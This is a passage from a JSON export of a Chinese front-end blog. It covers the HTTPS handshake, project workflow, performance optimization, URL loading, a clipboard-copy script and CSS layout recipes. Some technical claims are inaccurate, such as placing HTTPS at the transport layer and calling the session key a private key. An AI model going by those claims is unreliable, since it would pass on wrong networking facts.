这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。 6）服务段解密信息： 服务端用私钥解密后，得到了客户端传过来的随机值(私钥)，然后把内容通过该值进行对称加密。所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。 7）传输加密后的信息(4): 这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。 8）客户端解密信息： 客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容。整个过程第三方即使监听到了数据，也束手无策。 以上过程总共经过四次握手。 HTTPS的优缺点： 优点是相比HTTP来说要安全些。 缺点是安全范围也是有限的，比如在黑客攻击、服务器劫持等不气作用；此外，https需要费用；再者，HTTPS协议握手阶段比较费时，对网站的相应速度没有http高效，如非必要，没有理由牺牲用户体验。 HTTPS与HTTP区别： 1、HTTP 的 URL 以 http:// 开头，而 HTTPS 的 URL 以 https:// 开头 2、HTTP 是不安全的，而 HTTPS 是相对安全的 3、HTTP 标准端口是 80 ，而 HTTPS 的标准端口是 443 4、在 OSI 网络模型中，HTTP 工作于应用层，而 HTTPS 工作在传输层 5、HTTP 无需加密，无需证书，而 HTTPS 对传输的数据进行加密，需要认证证书 一般来说，对于涉及机密数据的交互处理使用HTTPS协议，而对于安全要求不高的完美使用HTTP就好了。假如为了安全保密，将一个网站所有的Web应用都启用SSL技术来加密，并使用HTTPS协议进行传输，那么该网站的性能和效率将会大大降低。总之不需要用https 的地方,就尽量不要用。 标注： 参考资料1：https://www.cnblogs.com/ranyonsue/p/5984001.html 参考资料2：http://www.techweb.com.cn/network/system/2016-10-11/2407736.shtml 参考资料3：https://www.cnblogs.com/myvin/p/4862167.html 参考资料4：http://blog.csdn.net/hla199106/article/details/46987401","categories":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/categories/网络协议/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/tags/网络协议/"}]},{"title":"企业项目开发流程","slug":"project-gemo-productDevel","date":"2018-03-07T06:47:53.000Z","updated":"2019-01-25T10:16:27.485Z","comments":true,"path":"2018/03/07/project-gemo-productDevel/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/07/project-gemo-productDevel/","excerpt":"","text":"一、前景 相信大家也都做过项目了，那么对于一个企业项目来说，从甲方提需求，到项目正式运转，在企业开发团队中，到底经过了些什么呢？ 二、步骤 1、甲方提需求: 甲方会口头或者文字描述（一般而言），向开发团队（项目经理）描述项目需求。 2、整理需求文档: 项目经理根据甲方提出的需求，整理出项目需求文档。 3、手绘线框图: 项目经理根据需求文档，手绘出相应的线框图。 4、设计交互原型: 项目经理再根据线框图，设计出交互原型，以上步骤均需与甲方频繁对接，确保甲方满意。 5、设计师UI设计: 设计师根据交互原型，设计出UI。 6、需求分析: 开发人员（系统分析师）对项目需求进行分析，看看各功能应该如何进行。 7、绘制用例图: 开发人员（系统分析师）根据需求分析的结果，绘制用例图。 用例图：由参与者、用例，边界以及它们之间的关系构成的用于描述系统功能的视图。如： 8、编写用例描述文档: 开发人员（系统分析师）根据用例图，以文档的形式对用例进行描述。 9、绘制领域类图: 开发人员（系统分析师）根据用例图，绘制出领域类图。（期间包括了鲁班图–即类之间的那层动作） 领域类图：描述业务实体的静态结构，包括业务实体、业务实体的业务属性及业务操作、业务实体间具有的关系。如： 10、绘制时序图: 开发人员（系统分析师）根据领域类图，绘制时序图。 时序图：通过描述对象之间发送消息的时间顺序显示多个对象之间的动态协作。 11、计划与编码: 开发人员根据UI设计图以及各种图，计划进程，开始编码。 其中，包括了计划、编码、发布、测试、反馈，如此循环。 测试环节包括了各种功能性测试，即看成果是否满足功能需求。 12、初步发布上线: 开发人员将项目上线后，进行非功能性测试，包括了性能、安全性、可使用性、兼容性、并发性等，如压力测试。 13、最终发布上线: 经过上面步骤后，基本一个项目也就完成了，当然后期的维护方面此处不做讲解。","categories":[{"name":"项目","slug":"项目","permalink":"http://liuxuewen-site.github.io/categories/项目/"}],"tags":[{"name":"项目","slug":"项目","permalink":"http://liuxuewen-site.github.io/tags/项目/"}]},{"title":"前端性能优化","slug":"property-bs-optimization","date":"2018-03-07T06:03:20.000Z","updated":"2019-01-25T10:16:38.700Z","comments":true,"path":"2018/03/07/property-bs-optimization/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/07/property-bs-optimization/","excerpt":"","text":"一、什么是前端性能优化？ 从用户访问资源到资源完整的展现在用户面前的过程中，通过技术手段和优化策略，缩短每个步骤的处理时间，从而提升整个资源的访问和呈现速度。 二、为什么要前端性能优化？ 在构建web站点的过程中，任何一个细节都有可能影响网站的访问速度，如果不了解性能优化知识，很多不利网站访问速度的因素会形成累加，从而严重影响网站的性能，导致网站访问速度变慢，用户体验低下，最终导致用户流失。 三、怎么做前端性能优化？1、前言 前端优化层出不穷，移动端大行其道的现在，我们可以说优化好移动端，PC端也将会更好。先上图： 就前端性能进行总结可分三个方面：网络方面、DOM操作及渲染方面、数据方面。 2、网络方面 web应用总有一部分时间浪费在网络连接和资源下载方面，这个层面的优化可以从「减少请求数目」开始： 1）减少http请求：主要通过减少请求数量，其反应时间自然也就加快了 &emsp;&emsp;a、合并css、js文件，可使用webpack、gulp之类的打包工具进行打包、分块、部分加载等。 &emsp;&emsp;b、图片使用雪碧图，即图片合并，也有专门的制作工具（PS、gulp.spritesmith插件）。 &emsp;&emsp;c、使用base64表示简单的图片（图片在网络传输中是以base64加密方式进行传输，可减少不必要请求）。 2）减小资源体积：主要通过压缩体积，最直接的就是传输速度会加快，及流量会减少。 &emsp;&emsp;a、gzip压缩，是http协议上的gzip压缩编码技术，针对html将其中重复的部分进行一个打包，比如纯文本内容进行压缩之后大小可以缩小大概40%左右。一般在www服务器上配置服务实现。 &emsp;&emsp;b、css、js文件做简单压缩。 &emsp;&emsp;c、图片压缩，在不影响观感的前提下，减少矢量图、高清图等的使用。 3）缓存： &emsp;&emsp;a、DNS缓存，DNS域名解析IP会消耗一定时间，做好缓存能有效减少请求时间。 &emsp;&emsp;b、CDN部署与缓存，CDN作为静态资源文件的分发网络，即静态资源不放主服务器，本身已经提升了网站静态资源的获取速度，同时也给静态资源做好缓存工作，有效的利用已缓存的静态资源，加快获取速度。 &emsp;&emsp;c、http缓存，给资源设定缓存时间，防止在有效的缓存时间内对资源进行重复的下载，从而提升整体网页的加载速度。 4）移动端优化： &emsp;&emsp;a、使用长cache，减少重定向。 &emsp;&emsp;b、首屏优化，保证首屏加载数据小于14kb。 &emsp;&emsp;c、不滥用web字体。 3、渲染和DOM操作方面 在网页初步加载时，获取到HTML文件后，最初的工作是构建DOM和构建CSSOM两个树，之后将他们合并形成渲染树，最后对其进行打印。缩短此过程也是一种优化。 1）优化网页渲染： &emsp;&emsp;a、css的文件放在头部，css在解析过程中不会阻塞DOM树的处理，放头部时DOM树和CSSOM树可以一起处理，若放在尾部，DOM树处理完后还要等待CSSOM的处理，导致性能下降。 &emsp;&emsp;b、js文件放在尾部或者异步，js文件在处理过程中会阻塞DOM的处理，放尾部可节省阻塞的时间，优化网页。 &emsp;&emsp;c、尽量避免內联样式，可有效的减少html的体积。 2）DOM操作优化： &emsp;&emsp;a、减少回流和重绘，比如说避免在document上直接进行频繁的DOM操作、使用classname代替大量的内联样式修改、对于复杂的UI元素设置position为absolute或fixed，因为进行一次DOM操作的代价是非常大的。 &emsp;&emsp;b、尽量使用css动画，相较于js复杂动画浏览器本身会进行优化。 &emsp;&emsp;c、使用requestAnimationFrame代替setInterval操作，setInterval定时器会有一定的延时，对于变动性高的动画来说，会出现卡顿现象。 &emsp;&emsp;d、适当使用canvas,其会加重浏览器渲染的压力，同时导致性能的下降。 &emsp;&emsp;e、使用事件代理。举个例子：一段列表都需要设定点击事件，这时如果你给列表中的每一项设定监听，往往会导致整体的性能下降，但是如果你给整个列表设置一个事件，然后通过点击定位目标来触发相应的操作，往往性能就会得到改善。 3）操作细节注意： &emsp;&emsp;a、避免图片或者frame使用空src。 &emsp;&emsp;b、在css属性为0时，去掉单位。 &emsp;&emsp;c、禁止图像缩放。 &emsp;&emsp;e、移除空的css规则。 &emsp;&emsp;f、对于css中可继承的属性，如font-size，尽量使用继承，少一点设置。 &emsp;&emsp;g、缩短css选择器，多使用伪元素等帮助定位。 4）移动端优化： &emsp;&emsp;a、长列表滚动优化。 &emsp;&emsp;b、函数防抖和函数节流。函数防抖，当调用动作过n毫秒后，才会执行该动作，若在这n毫秒内又调用此动作则将重新计算执行时间；函数节流，预先设定一个执行周期，当调用动作的时刻大于等于执行周期则执行该动作，然后进入下一个新周期。 &emsp;&emsp;c、使用touchstart、touchend代替click。 &emsp;&emsp;e、HTML的viewport设置。 &emsp;&emsp;f、开启GPU渲染加速。 4、数据方面 页面与用户的交互响应，往往伴随着数据交互处理，以及ajax的异步请求等内容，对数据的优化也是一种性能优化。 1）图片加载处理： &emsp;&emsp;a、图片预加载。即提前加载内容，往往在图片资源比较大时使用。如图片漫画展示时往往会预加载一张到两张的图片。 &emsp;&emsp;b、图片懒加载。即先加载看到的资源，而其他资源随着用户的滚动随即显示。 &emsp;&emsp;c、首屏加载时进度条的显示，提醒用户进行等待。 2）异步请求优化： &emsp;&emsp;a、使用正常的json数据格式进行交互，其格式轻巧，结构简单，可优化前后端的数据通信。 &emsp;&emsp;b、部分常用数据的缓存，可保证ajax请求的减少。 &emsp;&emsp;c、数据埋点和统计。 标注： 参考资料1：https://github.com/laizimo/zimo-article","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-性能优化","slug":"前端-性能优化","permalink":"http://liuxuewen-site.github.io/tags/前端-性能优化/"}]},{"title":"浏览器中输入URL并回车后发生了什么","slug":"network-bs-urlEnter","date":"2018-03-07T03:00:07.000Z","updated":"2019-01-25T10:15:56.552Z","comments":true,"path":"2018/03/07/network-bs-urlEnter/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/07/network-bs-urlEnter/","excerpt":"","text":"一、URL解析： URL（Universal Resource Locator）：统一资源定位符。俗称网页地址或者网址。表示某个资源的地址。其组成为： –&gt; URL解析后，浏览器抽取出域名字段进行DNS解析。 二、DNS解析： DNS实际上是一个域名和IP对应的数据库。DNS解析也即域名解析，获取域名对应ip地址。 浏览器输入IP地址是直接从主机上调用内容，输入域名是通过域名解析服务器指向对应主机的IP地址，再从主机调用内容。 DNS解析步骤： 1）查询浏览器缓存：浏览器会缓存之前拿到的DNS 2-30分钟时间，若找到即直接获取目的主机的ip地址，若无 2）查询系统缓存 ：检查hosts文件，其保存了一些以前访问过的网站的域名和IP数据。若无找到 3）查询路由器缓存：路由器有自己的DNS缓存，可能包括了查询的内容。若无找到 4）查询ISP DNS缓存：ISP服务商DNS缓存（本地服务器缓存）那里可能有相关的内容，若无找到 5）递归查询：从根域名服务器到顶级域名服务器再到极限域名服务器依次搜索对应目标域名的IP。 –&gt; 获取到域名对应的IP后即向该IP地址定位的HTTP服务器发起TCP连接。 三、浏览器与网站建立TCP连接（三次握手） 第一次握手：客户端向服务器端发送请求，等待服务器确认（SYN=1）； 第二次握手：服务器收到请求并确认，回复一个指令（SYN=1，ACK=1）； 第三次握手：客户端收到服务器的回复指令并返回确认（ACK=1）。 –&gt; 三次握手建立了客户端和服务器之间的连接，现在可以请求和传输数据了。 四、请求和传输数据 比如要通过get请求访问http://www.dydh.org/，通过抓包可以看到： 响应头中有一个：Set-Cookie:”……”，说明浏览器中没有关于这个网站的cookie信息。当我们下一次访问相同的网站时： 请求头中包含了这个cookie信息，Cookie:”……”。 cookie可以用来保存一些有用的信息：如果是首次访问，会提示服务器建立用户缓存信息，如果不是，可以利用Cookies对应键值，找到相应缓存，缓存里面存放着用户名，密码和一些用户设置项。 –&gt; 通过请求可以将服务器上的目标文件传输到浏览器进行渲染。 五、浏览器渲染页面 客户端拿到服务器端传输来的文件，找到HTML和MIME文件，通过MIME浏览器知道要用页面渲染引擎来处理HTML。 a .浏览器会解析html源码，然后创建一个 DOM树。 在DOM树中，每一个HTML标签都有一个对应的节点，并且每一个文本也都会有一个对应的文本节点。 b .浏览器解析CSS代码，计算出最终的样式数据，形成css对象模型CSSOM。 忽略非法的CSS代码，按照浏览器默认设置——用户设置——外链样式——内联样式——HTML中的style样式顺序进行渲染。 c .利用DOM和CSSOM构建一个渲染树（rendering tree）。 渲染树和DOM树有点像，但是是有区别的。DOM树完全和html标签一一对应，但渲染树会忽略掉不需要渲染的元素，比如head、display:none等。 d .浏览器根据渲染树直接把页面绘制到屏幕上。 标注： 参考资料1：https://www.cnblogs.com/tisikcci/p/5866753.html","categories":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/categories/网络协议/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"http://liuxuewen-site.github.io/tags/网络协议/"}]},{"title":"前端基础考题6","slug":"frontEnd-basic6","date":"2018-02-16T08:39:11.000Z","updated":"2019-01-25T10:04:58.831Z","comments":true,"path":"2018/02/16/frontEnd-basic6/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/16/frontEnd-basic6/","excerpt":"","text":"一、js实现点击复制功能 功能：点击按钮，复制一个标签里的文本。 原理：浏览器提供了 copy 命令 document.execCommand(“copy”) 可以复制选中的内容。如果是输入框，可以通过 select() 方法选中输入框的文本，然后调用 copy 命令，将文本复制到剪切板。但是 select() 方法只对 &lt; input &gt; 和 &lt; textarea &gt; 有效，对于 &lt; p &gt; 就不好使。解决是在页面中添加一个 &lt; textarea &gt;，然后把它隐藏掉，点击按钮的时候，先把 &lt; textarea &gt; 的 value 改为 &lt; p &gt; 的 innerText，然后复制 &lt; textarea &gt; 中的内容。 实现： 1234567891011121314151617181920212223242526272829303132333435 &lt;script&gt; let textArea; function getTextArea () &#123; if (textArea) &#123; return textArea; &#125; textArea = document.createElement('textarea'); addClass(textArea, 'x-copy-hidden-textarea'); document.body.appendChild(textArea); return textArea; &#125; export function copy (value) &#123; let dom = getTextArea(); dom.value = value; dom.select(); document.execCommand('copy'); // 执行浏览器复制命令 alert('复制成功'); &#125;&lt;/script&gt;&lt;style&gt; .x-copy-hidden-textarea &#123; position: absolute; top: 0; left: 0; opacity: 0; z-index: -10; &#125;&lt;/style&gt; 标注： 本文来自牛客网","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-考题","slug":"前端-考题","permalink":"http://liuxuewen-site.github.io/tags/前端-考题/"}]},{"title":"CSS布局基础","slug":"CSS-bs-cssLayout","date":"2018-02-15T08:10:07.000Z","updated":"2018-07-03T16:55:34.599Z","comments":true,"path":"2018/02/15/CSS-bs-cssLayout/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/15/CSS-bs-cssLayout/","excerpt":"","text":"一、CSS三种布局定位机制 标准文档流、浮动、定位。 二、标准文档流 1）特点：从上到下，从左到右，输出文档内容；由块级元素与行级元素组成（两者都是盒子模型） 2）块级元素：从左到右撑满页面，独占一行；触碰到页面边缘时自动换行。 3）行级元素：能在同一行内显示；不会改变HTML文档的结构 。 4）盒子模型：由 “margin border padding 盒子内容” 组成 5）盒子模型的3D模型：盒子模型的3D模型分为五层，由这五层叠加而成 &emsp;&emsp;第一层是Border； &emsp;&emsp;第二层是Content+Padding； &emsp;&emsp;第三层是Background-image； &emsp;&emsp;第四层是Background-color; &emsp;&emsp;第五层是Margin; 三、浮动布局 1）初衷：实现文字的环绕效果 2）特点：可实现横向多列布局，以设置float属性实现 3）Float：可取left、right、none；元素会左移或右移动至触碰到容器；设置了浮动的元素脱离了标准文档流 4）特性：包裹性、破坏性、清空格 a、包裹性：指使用float的元素会自动加上一个块级框，即可像块级元素那样设置高与宽，div设置float后，其宽度会自动调整为包裹住的内容宽度，而非撑满父容器（假如在一行之上只有极少的空间可供浮动元素，那么这个元素会跳至下一行，这个过程会持续到某一行拥有足够的空间为止。），这也是浮动之所以能横向多列布局的原因之一 b、破坏性：指它会使父元素的高度塌陷，即父元素在计算高度时忽略浮动元素，这是标准而非bug，只是为了实现文字的浮动效果（浮动的影响） c、清空格：比如说正常下几个img中间有空格，但加入浮动后，img间没有了空格，这是空格被移动到了浮动元素之后。这一特性的根本原因是由于float会导致节点脱离文档流所致 5）清除浮动的影响 a、为父元素也设置浮动 b、为父元素添加上overflow：hidden + width c、于父元素中设置clear：both d、于父元素上应用一下样式（最常用的一种） 12345678.clearfix:after&#123; content:''; display:table; clear:both;&#125;.clearfix&#123; *zoom:1 /*兼容IE低版本*/&#125; 四、定位布局 1）特点：可实现横向多列较为复杂的布局，由position属性实现 2）Position：可取static、relative、absolute、fixed 3）相对定位（relative）： 特点： a、自身性 — 相对自身原先位置进行定位。 b、无侵入 — 不会影响其他元素的布局，只是自身移动（可能产生空间堆叠，relative的在上），偏移后原先位置仍在，但可以把其他元素移动至此。 c、设置了相对定位的元素仍处于文档流中，随即拥有偏移属性以及z-index属性。 d、relative中若同时设置对立属性，如Left与Right，Top与Bottom，表现是top&gt;bottom left&gt;right。 4）绝对定位（absolute）： 特点： a、以包含块为基准定位。 b、完全脱离了文档流，随即拥有偏移属性以及z-index属性。 c、若无设置偏移量：无论是否存在已经定位的祖先元素，都保持在元素原有位置。 d、若设置了偏移量：若无已定位的祖先元素，则以HTML为偏移参照基准；若有已定位的祖先元素，则以最近的祖先元素为偏移基准。 5）固定定位（fixed）： 特点： a、以父包含块为基准，初始位置于父包含快左上角；也是一直绝对定位；完全脱离了文档流。 b、fixed无论有无已定位的祖先元素，均以浏览器可视化窗口为偏移基准。 c、位置固定，不随滚动条变化，被其遮住的元素，可从其下经过。","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-CSS","slug":"前端-CSS","permalink":"http://liuxuewen-site.github.io/tags/前端-CSS/"}]},{"title":"web页面布局","slug":"CSS-bs-webLayout","date":"2018-02-15T08:04:53.000Z","updated":"2019-01-25T10:22:42.289Z","comments":true,"path":"2018/02/15/CSS-bs-webLayout/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/15/CSS-bs-webLayout/","excerpt":"","text":"一、划分一1、固定布局Fixed 在固定布局中，网页宽度须指定为一个像素值，一般为960px。 优点： 1）960px是最适合作为网格布局的宽度，因为可以整除3，4，5，6，8，10，12和15。 2）具有很强的稳定性与可控性。 缺点： 1）固定宽度必须考虑网站是否可以适用于不同的屏幕宽度。 2、流式布局Fluid 流布局使用的是百分比。 优点： 1）具有很强的可塑性和流动性。通过设置百分比，不需要考虑设备尺寸或屏幕宽度大小，可以为每种情形找到一种可行的方案，因为你的设计尺寸将适应所有的设备尺寸。流式布局与媒体查询和优化样式技术密切相关。 3、弹性布局Elastic 弹性布局的大小单位不是像素或百分比，而是em或者rem。 rem/em区别：rem是相对于html元素的font-size大小而言的，而em是相对于其父元素。 优点： 1）比像素或百分比更加灵活。 2）支持浏览器的字体大小调整和缩放等的正常显示 4、响应式布局 使用@media媒体查询给不同尺寸和介质的设备切换不同的样式。 优点： 1）适应pc和移动端，如果足够耐心，效果完美。 缺点： 1）媒体查询是有限的，也就是可以枚举出来的，只能适应主流的宽高。 2）要匹配足够多的屏幕大小，工作量不小，设计也需要多个版本。 5、伸缩布局 使用css3 Flex系列属性进行相对布局。对于富媒体和复杂排版的支持非常大，但是存在兼容性问题。 有flex、flexible、vhvm等 二、划分二1、单列布局 注：下面各个实例中实现的是child元素的对齐操作，child元素的父容器是parent元素 1）水平居中： a、使用inline-block 和 text-align实现 123456789.parent&#123; text-align: center;&#125;.child&#123; display: inline-block;&#125;优点：兼容性好；不足：需要同时设置子元素和父元素 b、使用margin:0 auto来实现 1234567.child&#123; width:200px; margin:0 auto;&#125;优点：兼容性好缺点: 需要指定宽度 c、使用table实现 1234567.child&#123; display:table; margin:0 auto;&#125;优点:只需要对自身进行设置不足:IE6,7需要调整结构 d、使用绝对定位实现 1234567891011.parent&#123; position:relative;&#125;/*或者使用margin-left的负值为盒子宽度的一半也可以实现，不过这样就必须知道盒子的宽度，但兼容性好*/.child&#123; position:absolute; left:50%; transform:translate(-50%);&#125;不足：兼容性差,IE9及以上可用 e、实用flex布局实现 1234567891011121314/*第一种方法*/.parent&#123; display:flex; justify-content:center;&#125;/*第二种方法*/.parent&#123; display:flex;&#125;.child&#123; margin:0 auto;&#125;缺点：兼容性差，如果进行大面积的布局可能会影响效率 2）垂直居中： a、vertical-align 12345678910111213141516只有一个元素属于inline或inline-block（table-cell也可以理解为inline-block）水平，其身上的vertical-align属性才会起作用；在使用vertical-align的时候，由于对齐的基线是用行高的基线作为标记，故需要设置line-height或设置display:table-cell;/*第一种方法*/.parent&#123; display:table-cell; vertical-align:middle; height:20px;&#125;/*第二种方法*/.parent&#123; display:inline-block; vertical-align:middle; line-height:20px;&#125; b、实用绝对定位 12345678.parent&#123; position:relative;&#125;.child&#123; positon:absolute; top:50%; transform:translate(0,-50%);&#125; c、实用flex实现 1234.parent&#123; display:flex; align-items:center;&#125; 3）水平垂直全部居中： a、利用vertical-align,text-align,inline-block实现 12345678.parent&#123; display:table-cell; vertical-align:middle; text-align:center;&#125;.child&#123; display:inline-block;&#125; b、利用绝对定位实现 123456789.parent&#123; position:relative;&#125;.child&#123; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);&#125; c、利用flex实现 12345.parent&#123; display:flex; justify-content:center; align-items:center;&#125; 2、多列布局 1）左列定宽，右列自适应： a、利用float+margin实现 123456789.left&#123; float:left; width:100px;&#125;.right&#123; margin-left:100px;&#125;注：IE6会有3px的bug b、利用float+margin(fix)实现 12345678910111213141516171819&lt;div class=\"parent\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right-fix\"&gt; &lt;div class=\"right\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;.left&#123; width:100px; float:left;&#125;.right-fix&#123; width:100%; margin-left:-100px; float:right;&#125;.right&#123; margin-left:100px;&#125; c、使用float+overflow实现 12345678910111213141516171819202122232425.left&#123; width:100px; float:left;&#125;.right&#123; overflow:hidden;&#125;右侧利用overflow:hidden，触发bfc模式，浮动无法影响，隔离其他元素，IE6不支持，左侧left设置margin-left当作left与right之间的边距。如果我们需要将两列设置为等高，可以用下述方法将“背景”设置为等高，其实并不是内容的等高.left&#123; width:100px; float:left;&#125;.right&#123; overflow:hidden;&#125;.parent&#123; overflow:hidden;&#125;.left,.right&#123; padding-bottom:9999px; margin-bottom:-9999px;&#125; d、使用table实现 1234567891011.parent&#123; display:table; table-layout:fixed; width:100%;&#125;.left&#123; width:100px;&#125;.right,.left&#123; display:table-cell;&#125; e、实用flex实现 123456.parent&#123;display:flex;&#125;.left&#123;width:100px;&#125;.right&#123;flex:1;&#125;利用右侧容器的flex:1，均分了剩余的宽度，也实现了同样的效果。而align-items 默认值为stretch，故二者高度相等 2）右列定宽，左列自适应： a、实用float+margin实现 12345678910111213141516.parent&#123; background:red; height:100px; margin:0 auto;&#125;.left&#123; background:green; margin-right:-100px; width:100%; float:left;&#125;.right&#123; background:blue; float:right; width:100px;&#125; b、使用table实现 123456789101112.parent&#123; display:table; table-layout:fixed; width:100%;&#125;.left&#123; display:table-cell;&#125;.right&#123; width:100px; display:table-cell;&#125; c、实用flex实现 123456789.parent&#123; display:flex;&#125;.left&#123; flex:1;&#125;.right&#123; width:100px;&#125; 3）两列定宽，一列自适应: a、利用float+margin实现 1234567.left,.center&#123; float:left; width:200px;&#125;.right&#123; margin-left:400px;&#125; b、利用table实现 1234567891011.parent&#123; display:table; table-layout:fixed; width:100%;&#125;.left,.center,.right&#123; display:table-cell;&#125;.left,.center&#123; width:200px;&#125; c、利用flex实现 123.parent&#123;display:flex;&#125;.left,.center&#123;width:100px;&#125;.right&#123;flex:1&#125; 4）两侧定宽，中栏自适应: a、利用float+margin实现 12345678910111213.left&#123; width：100px; float:left;&#125;.center&#123; float:left; width:100%; margin-right:-200px;&#125;.right&#123; width:100px; float:right;&#125; b、利用table实现 1234567891011121314.parent&#123; width:100%; display:table; table-layout:fixed&#125;.left,.center,.right&#123; display:table-cell;&#125;.left&#123; width:100px;&#125;.right&#123; width:100px;&#125; c、利用flex实现 1234.parent&#123;display:flex;&#125;.left&#123;width:100px;&#125;.center&#123;flex:1;&#125;.right&#123;width:100px;&#125; 5）一列不定宽，一列自适应: a、利用float+overflow实现 12.left&#123;float:left;&#125;.right&#123;overflow:hidden;&#125; b、利用table实现 1234567891011.parent&#123; display:table; table-layout:fixed; width:100%;&#125;.left&#123; width:0.1%;&#125;.left,.right&#123; display:table-cell;&#125; c、利用flex实现 12.parent&#123;display:flex;&#125;.right&#123;flex:1;&#125; 6）多列等分布局: 1234567html结构&lt;div class=\"parent\"&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt;&lt;/div&gt; a、实用float实现 123456789.parent&#123; margin-left:-20px /*假设列之间的间距为20px*/&#125;.column&#123; float:left; width:25%; padding-left:20px; box-sizing:border-box;&#125; b、利用table实现 123456789101112.parent-fix&#123; margin-left:-20px;&#125;.parent&#123; display:table; table-layout:fixed; width:100%;&#125;.column&#123; display:table-cell; padding-left:20px;&#125; c、利用flex实现 123.parent&#123;display:flex;&#125;.column&#123;flex:1;&#125;.column+.column&#123;margin-left:20px;&#125; 7）九宫格布局: a、使用table实现 123456789&lt;div class=&quot;parent&quot;&gt; &lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;.parent&#123;display:table;table-layout:fixed;width:100%;&#125;.row&#123;display:table-row;&#125;.item&#123;display:table-cell;width:33.3%;height:200px;&#125; b、实用flex实现 123456789&lt;div class=&quot;parent&quot;&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;.parent&#123;display:flex;flex-direction:column;&#125;.row&#123;height:100px;display:flex;&#125;.item&#123;width:100px;background:red;&#125; 3、全屏布局 a、利用绝对定位实现 123456789101112&lt;div class=&quot;parent&quot;&gt; &lt;div class=&quot;top&quot;&gt;top&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;bottom&lt;/div&gt;&lt;/div&gt;html,body,parent&#123;height:100%;overflow:hidden;&#125;.top&#123;position:absolute:top:0;left:0;right:0;height:100px;&#125;.left&#123;position:absolute;top:100px;left:0;bottom:50px;width:200px;&#125;.right&#123;position:absolute;overflow:auto;left:200px;right:0;top:100px;bottom:50px;&#125;.bottom&#123;position:absolute;left:0;right:0;bottom:0;height:50px;&#125; b、利用flex实现 123456789101112131415&lt;div class=&quot;parent&quot;&gt; &lt;div class=&quot;top&quot;&gt;top&lt;/div&gt; &lt;div class=&quot;middle&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;bottom&lt;/div&gt;&lt;/div&gt;.parent&#123;display:flex;flex-direction:column;&#125;.top&#123;height:100px;&#125;.bottom&#123;height:50px;&#125;.middle&#123;flex:1;display:flex;&#125;.left&#123;width:200px;&#125;.right&#123;flex:1;overflow:auto;&#125; 4、响应式布局 a、meta标签的实用 设置布局宽度等于设备宽度，布局viewport等于度量viewport 1&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"&gt; b、媒体查询 123@media screen and (max-width:960px)&#123;....&#125;或者：&lt;link rel=\"stylesheet\" media=\"screen and (max-width:960px)\" href='xxx.css' /&gt; 标注： 参考资料1：http://blog.csdn.net/lyyo_cd/article/details/73329068 